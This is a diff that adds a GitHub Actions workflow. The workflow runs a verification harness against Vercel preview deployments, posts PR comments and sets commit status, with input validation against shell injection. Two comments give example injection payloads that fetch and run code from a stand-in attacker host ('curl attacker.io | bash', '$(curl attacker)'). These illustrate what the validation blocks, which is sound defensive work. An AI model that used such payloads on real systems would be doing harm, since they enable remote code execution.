@@ -1,0 +1,524 @@
+# .github/workflows/verify-phase.yml
+#
+# First GitHub Action on main from this branch (per stage-1.5c-verification-harness
+# CONTEXT.md <code_context>: .github/workflows/ doesn't exist on main as of HEAD
+# 7607bbf). This workflow is the CI driver for the 3-layer verification harness
+# shipped in Plans 1-5 of this phase.
+#
+# Per D-05: harness loop runs INSIDE /gsd-execute-phase BEFORE /nightwork-qa;
+# this workflow is the CI signal that Plan 8b loop-with-executor consumes.
+# Per EXPANDED-SCOPE §7 acceptance criteria: fires on push to phase/* + posts
+# PR comment + sets commit status.
+#
+# ITER-1 SEC-HIGH-1 amendment (per Jake watchpoint #1): ALL ${{ github.* }} and
+# ${{ inputs.* }} expressions flow through env: blocks; shell run: bodies
+# reference only env vars ($BRANCH, $PHASE, $SHA, etc.). This prevents shell
+# injection via branch names or input values containing metacharacters.
+# All inputs are regex-validated before substitution.
+#
+# ITER-1 C2 amendment: artifact retention 7 days (was 30); raw screenshot bytes
+# excluded from artifact upload glob. Screenshots stay only in gitignored runs/
+# on the runner per D-30.
+
+name: verify-phase
+
+on:
+  push:
+    branches:
+      - "phase/**"
+  workflow_dispatch:
+    inputs:
+      preview_url:
+        description: "Vercel preview URL (optional; auto-discovered if omitted)"
+        required: false
+        type: string
+      phase:
+        description: "Phase name (e.g. stage-1.5c-verification-harness)"
+        required: true
+        type: string
+
+# One harness run per branch at a time. Stale runs canceled when a new push
+# lands. Avoids racing with itself on rapid push cadence.
+concurrency:
+  group: verify-phase-${{ github.ref }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+  pull-requests: write   # for PR comment posting
+  statuses: write        # for commit status
+
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30   # well above the < 5min target; safety net for vision API stalls
+
+    env:
+      # Per CLAUDE.md + D-29: secrets only, never committed.
+      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+      VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+      HARNESS_FIXTURE_PASSWORD: ${{ secrets.HARNESS_FIXTURE_PASSWORD }}
+      NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
+      NEXT_PUBLIC_SUPABASE_ANON_KEY: ${{ secrets.NEXT_PUBLIC_SUPABASE_ANON_KEY }}
+      # Vercel Deployment Protection bypass (added per nwrp60 FIX 1).
+      # Generated in Vercel project Settings → Deployment Protection →
+      # Protection Bypass for Automation. Threaded into route-status.ts as
+      # x-vercel-protection-bypass header so the harness can probe protected
+      # preview URLs (default returns HTTP 401 without this).
+      # If unset, route-status sends no bypass header (works for unprotected
+      # local dev URLs).
+      VERCEL_AUTOMATION_BYPASS_SECRET: ${{ secrets.VERCEL_AUTOMATION_BYPASS_SECRET }}
+      # Nightwork app-layer verification bypass for /design-system/* routes
+      # (per nwrp68 FIX 9). Generated locally with `openssl rand -base64 32`,
+      # set in Vercel project env (Preview environment only — never in
+      # Production), and passed here so the harness can attach the header.
+      # Server-side gate in src/middleware.ts requires this secret +
+      # x-nightwork-verification-bypass header + VERCEL_ENV != production.
+      # If unset, harness behaves as before (fail-closed; no bypass).
+      VERIFICATION_BYPASS_SECRET: ${{ secrets.VERIFICATION_BYPASS_SECRET }}
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          # Need full history so the harness can git rev-parse HEAD + branch name.
+          # Per scalability W-2: re-evaluate at Wave 5 if checkout time becomes
+          # the dominant CI cost (currently ~15s on a fresh runner; trivial).
+          fetch-depth: 0
+
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: "22"
+          cache: "npm"
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Install Playwright browsers (chromium only per current scope; Webkit deferred per Dependent-Soon §3 #9)
+        run: npx playwright install --with-deps chromium
+
+      # ITER-1 SEC-HIGH-1 amendment: env-var indirection.
+      # ALL ${{ github.* }} and ${{ inputs.* }} flow through env: block.
+      # Shell `run:` body references only env vars ($EVENT_NAME, $BRANCH, $INPUT_PHASE).
+      # This prevents shell injection via branch names containing metacharacters
+      # (e.g., a branch named 'phase/1.5-c; curl attacker.io | bash' cannot execute).
+      - name: Determine phase
+        id: phase
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_PHASE: ${{ github.event.inputs.phase }}
+          BRANCH: ${{ github.ref_name }}
+        run: |
+          if [[ "$EVENT_NAME" == "workflow_dispatch" ]]; then
+            # Validate INPUT_PHASE: must match ^stage-[0-9.]+[a-z]?-[a-z0-9-]+$ (no shell metacharacters)
+            if ! [[ "$INPUT_PHASE" =~ ^stage-[0-9.]+[a-z]?-[a-z0-9-]+$ ]]; then
+              echo "::error::Invalid phase input: '$INPUT_PHASE' (must match ^stage-[0-9.]+[a-z]?-[a-z0-9-]+$)"
+              exit 1
+            fi
+            echo "phase=$INPUT_PHASE" >> "$GITHUB_OUTPUT"
+          else
+            # Derive phase from branch name. phase/1.5-c-verification-harness → stage-1.5c-verification-harness
+            # Validate BRANCH: must match ^phase/[a-z0-9.-]+$ (no shell metacharacters)
+            if ! [[ "$BRANCH" =~ ^phase/[a-z0-9.-]+$ ]]; then
+              echo "::error::Invalid branch name: '$BRANCH' (must match ^phase/[a-z0-9.-]+$ — security: prevents shell injection)"
+              exit 1
+            fi
+            # Strip "phase/" prefix
+            PHASE_SUFFIX="${BRANCH#phase/}"
+            # Map IA convention to phase dir: 1.5-c-verification-harness → stage-1.5c-verification-harness
+            # (the dir under .planning/phases/ has stage- prefix and dot-collapsed dot-c form)
+            # Heuristic: phase/1.5-c-X → stage-1.5c-X
+            STAGE_NAME=$(echo "$PHASE_SUFFIX" | sed 's/^\([0-9.]*\)-\([a-z]\)-/\1\2-/')
+            echo "phase=stage-$STAGE_NAME" >> "$GITHUB_OUTPUT"
+          fi
+          echo "Phase resolved: $(grep '^phase=' "$GITHUB_OUTPUT" | tail -1)"
+
+      # ITER-1 SEC-HIGH-1: env-var indirection for all github.* expressions.
+      - name: Set commit status (pending)
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+          SERVER_URL: ${{ github.server_url }}
+          RUN_ID: ${{ github.run_id }}
+        run: |
+          gh api -X POST "/repos/$REPO/statuses/$SHA" \
+            -f state=pending \
+            -f context=verify-phase \
+            -f description="Harness running…" \
+            -f target_url="$SERVER_URL/$REPO/actions/runs/$RUN_ID"
+
+      # Wait for Vercel preview "Ready" before invoking harness.
+      # Per Jake watchpoint #2: harness must not run against a building preview.
+      # Per Jake watchpoint #3: this is the LIVE test of the Vercel REST API path
+      # in src/lib/verification/vercel-discovery.ts (Plan 5 deferred this; Plan 6
+      # owns it). The harness re-discovers the URL itself via vercel-discovery,
+      # but this gate ensures we only invoke the harness after Vercel reports the
+      # deployment is READY (not BUILDING / QUEUED / ERROR).
+      #
+      # Exponential backoff: 10s, 20s, 40s, 60s, 60s, 60s, 60s — up to ~5min total.
+      # Skipped on workflow_dispatch when INPUT_PREVIEW_URL is provided (operator
+      # already knows the URL is ready).
+      - name: Wait for Vercel preview to be Ready
+        id: vercel-wait
+        env:
+          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+          BRANCH: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          INPUT_PREVIEW_URL: ${{ github.event.inputs.preview_url }}
+          EVENT_NAME: ${{ github.event_name }}
+        run: |
+          if [[ "$EVENT_NAME" == "workflow_dispatch" ]] && [[ -n "$INPUT_PREVIEW_URL" ]]; then
+            echo "Skipping wait: preview_url provided via workflow_dispatch input."
+            exit 0
+          fi
+
+          if [[ -z "$VERCEL_TOKEN" ]]; then
+            echo "::warning::VERCEL_TOKEN not set; cannot wait for Vercel READY status. The harness will attempt its own discovery (REST API → CLI → deterministic) per Plan 5 hierarchy."
+            exit 0
+          fi
+
+          # Vercel REST API: GET /v6/deployments?meta-githubCommitSha=$SHA
+          # Returns deployments; we want the one matching the current commit SHA.
+          # State values: QUEUED | INITIALIZING | BUILDING | READY | ERROR | CANCELED
+          DELAYS=(10 20 40 60 60 60 60)
+          STATE=""
+          PREVIEW_URL=""
+          for delay in "${DELAYS[@]}"; do
+            sleep "$delay"
+            RESPONSE=$(curl -fsS \
+              -H "Authorization: Bearer $VERCEL_TOKEN" \
+              "https://api.vercel.com/v6/deployments?meta-githubCommitSha=$SHA&limit=20" \
+              2>/dev/null || echo '{"deployments":[]}')
+
+            # Parse: take the first deployment matching this commit SHA
+            STATE=$(echo "$RESPONSE" | node -e "
+              let body=''; process.stdin.on('data',c=>body+=c).on('end',()=>{
+                try {
+                  const d = JSON.parse(body).deployments || [];
+                  const m = d.find(x => x.meta && x.meta.githubCommitSha === process.env.SHA);
+                  process.stdout.write(m ? (m.state || '') : '');
+                } catch (e) { process.stdout.write(''); }
+              });
+            " 2>/dev/null || echo "")
+
+            PREVIEW_URL=$(echo "$RESPONSE" | node -e "
+              let body=''; process.stdin.on('data',c=>body+=c).on('end',()=>{
+                try {
+                  const d = JSON.parse(body).deployments || [];
+                  const m = d.find(x => x.meta && x.meta.githubCommitSha === process.env.SHA);
+                  process.stdout.write(m && m.url ? ('https://' + m.url) : '');
+                } catch (e) { process.stdout.write(''); }
+              });
+            " 2>/dev/null || echo "")
+
+            echo "[vercel-wait] state=$STATE url=$PREVIEW_URL (after ${delay}s)"
+
+            case "$STATE" in
+              READY)
+                echo "preview_url=$PREVIEW_URL" >> "$GITHUB_OUTPUT"
+                echo "[vercel-wait] Preview is READY: $PREVIEW_URL"
+                exit 0
+                ;;
+              ERROR|CANCELED)
+                echo "::error::Vercel deployment $STATE for commit $SHA. Aborting harness run."
+                exit 3
+                ;;
+              "")
+                # No deployment yet for this SHA; keep polling
+                continue
+                ;;
+              *)
+                # QUEUED / INITIALIZING / BUILDING — keep polling
+                continue
+                ;;
+            esac
+          done
+          echo "::error::Timeout waiting for Vercel preview (commit $SHA) to reach READY state. Last state: '$STATE'."
+          exit 3
+
+      # ITER-1 SEC-HIGH-1: env-var indirection. INPUT_PREVIEW_URL is validated
+      # against URL pattern before being passed to scripts/verify-phase.ts; an
+      # injection in the URL value (e.g., '$(curl attacker)') cannot execute.
+      # Discovered URL from vercel-wait step is also passed via env var.
+      - name: Run verification harness
+        id: harness
+        env:
+          INPUT_PREVIEW_URL: ${{ github.event.inputs.preview_url }}
+          DISCOVERED_PREVIEW_URL: ${{ steps.vercel-wait.outputs.preview_url }}
+          PHASE: ${{ steps.phase.outputs.phase }}
+          SHA: ${{ github.sha }}
+        run: |
+          set +e
+          # Decide which preview URL to pass (if any). Priority:
+          #   1. workflow_dispatch input (operator override)
+          #   2. vercel-wait discovered URL
+          #   3. neither — let harness's vercel-discovery resolve it
+          PREVIEW_URL=""
+          if [[ -n "$INPUT_PREVIEW_URL" ]]; then
+            # Validate URL: must be https:// + safe URL chars only.
+            # Pattern allows alphanumerics, dash, dot, slash, and standard URL safe punctuation;
+            # rejects spaces, semicolons, backticks, $, |, &, parentheses (block subshell injection).
+            if ! [[ "$INPUT_PREVIEW_URL" =~ ^https://[A-Za-z0-9.-]+(/[A-Za-z0-9._~/?#=-]*)?$ ]]; then
+              echo "::error::Invalid preview_url input: '$INPUT_PREVIEW_URL' (must be https:// URL with no shell metacharacters)"
+              exit 1
+            fi
+            PREVIEW_URL="$INPUT_PREVIEW_URL"
+          elif [[ -n "$DISCOVERED_PREVIEW_URL" ]]; then
+            # Validate discovered URL same way (defense-in-depth — Vercel API is trusted but validate anyway)
+            if ! [[ "$DISCOVERED_PREVIEW_URL" =~ ^https://[A-Za-z0-9.-]+(/[A-Za-z0-9._~/?#=-]*)?$ ]]; then
+              echo "::error::Invalid discovered preview URL: '$DISCOVERED_PREVIEW_URL'"
+              exit 1
+            fi
+            PREVIEW_URL="$DISCOVERED_PREVIEW_URL"
+          fi
+
+          if [[ -n "$PREVIEW_URL" ]]; then
+            EXTRA_ARGS=(--preview-url "$PREVIEW_URL")
+          else
+            EXTRA_ARGS=()
+          fi
+
+          npx tsx scripts/verify-phase.ts \
+            --phase "$PHASE" \
+            --commit-sha "$SHA" \
+            --mode ci \
+            "${EXTRA_ARGS[@]}" \
+            > harness-output.json
+          EXIT_CODE=$?
+          echo "exit_code=$EXIT_CODE" >> "$GITHUB_OUTPUT"
+          echo "[harness] verify-phase.ts exited with code $EXIT_CODE"
+        continue-on-error: true
+
+      # ITER-1 watchpoint #4: HarnessReport JSON parser robust to malformed stdout.
+      # The orchestrator emits a `{kind: "harness-report", report}` JSON object on
+      # stdout. We extract it defensively — handling (a) extra log lines before
+      # the JSON, (b) partial/empty output, (c) no JSON at all. The result is
+      # stored as a job output so downstream steps can branch on it. Defense-
+      # in-depth: even if the JSON cannot be parsed, the workflow continues to
+      # the report.md path + commit status mapping below.
+      - name: Parse harness JSON output
+        id: parse
+        if: always()
+        env:
+          PHASE: ${{ steps.phase.outputs.phase }}
+        run: |
+          if [[ ! -s harness-output.json ]]; then
+            echo "::warning::harness-output.json is empty or missing — harness produced no stdout."
+            echo "json_parsed=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          # Use Node to extract the LAST valid JSON object containing kind=harness-report.
+          # Robust to: log lines before/after, partial JSON (truncates at last valid),
+          # and pretty-printed multi-line JSON (the orchestrator emits with indent=2).
+          PARSED=$(node -e "
+            const fs = require('fs');
+            const raw = fs.readFileSync('harness-output.json', 'utf-8');
+            // Strategy: scan for opening '{' and try JSON.parse on every prefix that ends at a matching '}'.
+            // Picks up the largest valid JSON object that has kind==='harness-report'.
+            let result = null;
+            const len = raw.length;
+            for (let start = 0; start < len; start++) {
+              if (raw[start] !== '{') continue;
+              let depth = 0;
+              for (let end = start; end < len; end++) {
+                const c = raw[end];
+                if (c === '{') depth++;
+                else if (c === '}') {
+                  depth--;
+                  if (depth === 0) {
+                    try {
+                      const obj = JSON.parse(raw.slice(start, end + 1));
+                      if (obj && obj.kind === 'harness-report') {
+                        result = obj;
+                      }
+                    } catch (_) { /* ignore */ }
+                    break;
+                  }
+                }
+              }
+            }
+            if (!result) {
+              process.stderr.write('parse: no valid harness-report JSON found\n');
+              process.exit(0);
+            }
+            const r = result.report || {};
+            const lyr = r.results_by_layer || {};
+            const counts = {
+              layer1: (lyr.layer1 || []).length,
+              layer2: (lyr.layer2 || []).length,
+              layer3: (lyr.layer3 || []).length,
+            };
+            const ambiguous = (r.ambiguous_results || []).length;
+            const cost = r.total_vision_cost_usd || 0;
+            const dur = r.duration_ms || 0;
+            console.log(JSON.stringify({
+              json_parsed: true,
+              preview_url: r.preview_url || '',
+              preview_url_source: r.preview_url_source || '',
+              counts,
+              ambiguous,
+              cost_usd: cost,
+              duration_ms: dur,
+            }));
+          " 2>&1 || echo '')
+
+          if [[ -z "$PARSED" ]] || ! echo "$PARSED" | node -e "let b=''; process.stdin.on('data',c=>b+=c).on('end',()=>{try{JSON.parse(b);process.exit(0)}catch(e){process.exit(1)}})" 2>/dev/null; then
+            echo "::warning::Could not parse harness JSON output. Continuing with report.md fallback for PR comment."
+            echo "json_parsed=false" >> "$GITHUB_OUTPUT"
+          else
+            echo "json_parsed=true" >> "$GITHUB_OUTPUT"
+            echo "[parse] $PARSED"
+          fi
+
+      # ITER-1 SEC-HIGH-1: env-var indirection.
+      - name: Read final report
+        id: report
+        if: always()
+        env:
+          PHASE: ${{ steps.phase.outputs.phase }}
+        run: |
+          REPORT=".planning/verification/reports/$PHASE/final.md"
+          if [[ -f "$REPORT" ]]; then
+            echo "report_path=$REPORT" >> "$GITHUB_OUTPUT"
+            # Capture body for PR comment (truncate to 60K chars to stay under GH comment limit)
+            # Per iter-1 C5: final.md is ALREADY sanitized by report-writer.ts (no page URLs,
+            # no screenshot paths, no raw vision reasoning). Safe to post to PR comment.
+            BODY=$(head -c 60000 "$REPORT")
+            # Encode for env (multi-line via heredoc-style GH output)
+            {
+              echo "report_body<<REPORT_EOF_NW"
+              echo "$BODY"
+              echo "REPORT_EOF_NW"
+            } >> "$GITHUB_OUTPUT"
+          else
+            echo "::warning::Final report not found at $REPORT. Harness may have exited before report-writer ran."
+            echo "report_path=" >> "$GITHUB_OUTPUT"
+          fi
+
+      # ITER-1 C2 amendment: retention 30→7 days; exclude screenshot raw bytes
+      # from artifact upload. Anyone with repo Read can `gh run download` the
+      # artifact; once C1 ships authenticated harness sessions, screenshots may
+      # contain tenant-bearing route renders. Per D-30: screenshots stay only
+      # in gitignored runs/ on the runner; reports + halt artifacts (sanitized)
+      # land in the GH artifact for PR review.
+      #
+      # Path glob INTENTIONALLY does NOT include `runs/**/screenshots/**` — only
+      # report.md, HALT-*.md, and idempotency.json under runs/. Plus the
+      # git-tracked sanitized reports/ tree, plus harness-output.json (the JSON
+      # contract Plan 9 custodian sweep consumes).
+      - name: Upload artifacts (sanitized)
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: verify-phase-${{ github.sha }}
+          path: |
+            harness-output.json
+            .planning/verification/reports/
+            .planning/verification/runs/**/report.md
+            .planning/verification/runs/**/HALT-*.md
+            .planning/verification/runs/**/idempotency.json
+          # ITER-1 C2: explicit retention 7 days (was 30 — Anthropic-as-data-processor
+          # posture + tenant data minimization). HALT artifacts have a separate copy
+          # at reports/<phase>/halts/<commit>.md (git-tracked; SOC2 traceability per W3).
+          retention-days: 7
+          if-no-files-found: warn
+
+      # ITER-1 SEC-HIGH-1: env-var indirection for gh pr list + comment template.
+      # Per Jake watchpoint #5: PR comment + commit status format surfaces actionable
+      # info per nwrp48 PART 8. The final.md is rendered by report-writer.ts which
+      # already includes file:line, expected vs actual, and (where the layer
+      # supports it) suggested-fix snippets. The comment template adds run +
+      # artifact links for full traceability.
+      - name: Post PR comment
+        if: always() && github.event_name == 'push'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          BRANCH: ${{ github.ref_name }}
+          PHASE: ${{ steps.phase.outputs.phase }}
+          SHA: ${{ github.sha }}
+          SERVER_URL: ${{ github.server_url }}
+          REPO: ${{ github.repository }}
+          RUN_ID: ${{ github.run_id }}
+          REPORT_PATH: ${{ steps.report.outputs.report_path }}
+          REPORT_BODY: ${{ steps.report.outputs.report_body }}
+          EXIT_CODE: ${{ steps.harness.outputs.exit_code }}
+        run: |
+          # Find PR for this branch (if any). gh pr list takes --head as a
+          # plain branch ref — env-var indirection neutralizes any odd chars,
+          # but we also pre-validate $BRANCH for sanity.
+          if ! [[ "$BRANCH" =~ ^phase/[a-z0-9.-]+$ ]]; then
+            echo "::warning::Skipping PR comment: BRANCH '$BRANCH' does not match expected pattern."
+            exit 0
+          fi
+          PR_NUMBER=$(gh pr list --head "$BRANCH" --json number --jq '.[0].number // empty')
+          if [[ -z "$PR_NUMBER" ]]; then
+            echo "[pr-comment] No open PR for branch '$BRANCH'; skipping comment."
+            exit 0
+          fi
+          if [[ -z "$REPORT_PATH" ]]; then
+            # Degraded mode: harness errored before report-writer ran.
+            # Post a minimal "harness errored" comment so the PR shows SOMETHING.
+            BODY=$(printf '## Verification harness — `%s` @ `%s`\n\n**Status:** harness errored before producing a final report (exit code `%s`).\n\n[Workflow run](%s/%s/actions/runs/%s) · [Artifact](%s/%s/actions/runs/%s)\n' \
+              "$PHASE" "$SHA" "${EXIT_CODE:-unknown}" "$SERVER_URL" "$REPO" "$RUN_ID" "$SERVER_URL" "$REPO" "$RUN_ID")
+          else
+            # Build comment body via printf to avoid heredoc-meets-injection risk.
+            BODY=$(printf '## Verification harness — `%s` @ `%s`\n\n%s\n\n---\n[Workflow run](%s/%s/actions/runs/%s) · [Artifact](%s/%s/actions/runs/%s)\n' \
+              "$PHASE" "$SHA" "$REPORT_BODY" "$SERVER_URL" "$REPO" "$RUN_ID" "$SERVER_URL" "$REPO" "$RUN_ID")
+          fi
+          gh pr comment "$PR_NUMBER" --body "$BODY"
+
+      # ITER-1 SEC-HIGH-1: env-var indirection.
+      # Per Jake watchpoint #6: exit-code mapping matches Plan 5's verify-phase.ts
+      # CLI exit codes 0-4. See .github/workflows/README.md for the full table.
+      - name: Set commit status (final)
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          EXIT_CODE: ${{ steps.harness.outputs.exit_code }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+          SERVER_URL: ${{ github.server_url }}
+          RUN_ID: ${{ github.run_id }}
+        run: |
+          case "$EXIT_CODE" in
+            0)
+              STATE="success"
+              DESC="All 3 layers passed"
+              ;;
+            1)
+              STATE="failure"
+              DESC="Harness failed (failed-fixable)"
+              ;;
+            2)
+              STATE="failure"
+              DESC="Halt-for-Jake (failed-ambiguous: iter-3 OR confidence < 0.7)"
+              ;;
+            3)
+              STATE="error"
+              DESC="Vercel preview URL discovery failed"
+              ;;
+            *)
+              STATE="error"
+              DESC="Harness runtime error (exit ${EXIT_CODE:-unknown})"
+              ;;
+          esac
+          gh api -X POST "/repos/$REPO/statuses/$SHA" \
+            -f state="$STATE" \
+            -f context=verify-phase \
+            -f description="$DESC" \
+            -f target_url="$SERVER_URL/$REPO/actions/runs/$RUN_ID"
+
+      # ITER-1 SEC-HIGH-1: env-var indirection.
+      # Final job-level pass/fail signal. The harness step above used
+      # continue-on-error: true so the report + status steps could run; this
+      # step ensures the workflow itself fails when the harness fails, which
+      # is what feeds the commit-status badge + Plan 8b runLoop signal.
+      - name: Fail job on harness failure
+        if: ${{ steps.harness.outputs.exit_code != '0' }}
+        env:
+          EXIT_CODE: ${{ steps.harness.outputs.exit_code }}
+        run: |
+          echo "Harness exit code: ${EXIT_CODE:-unknown}"
+          exit 1
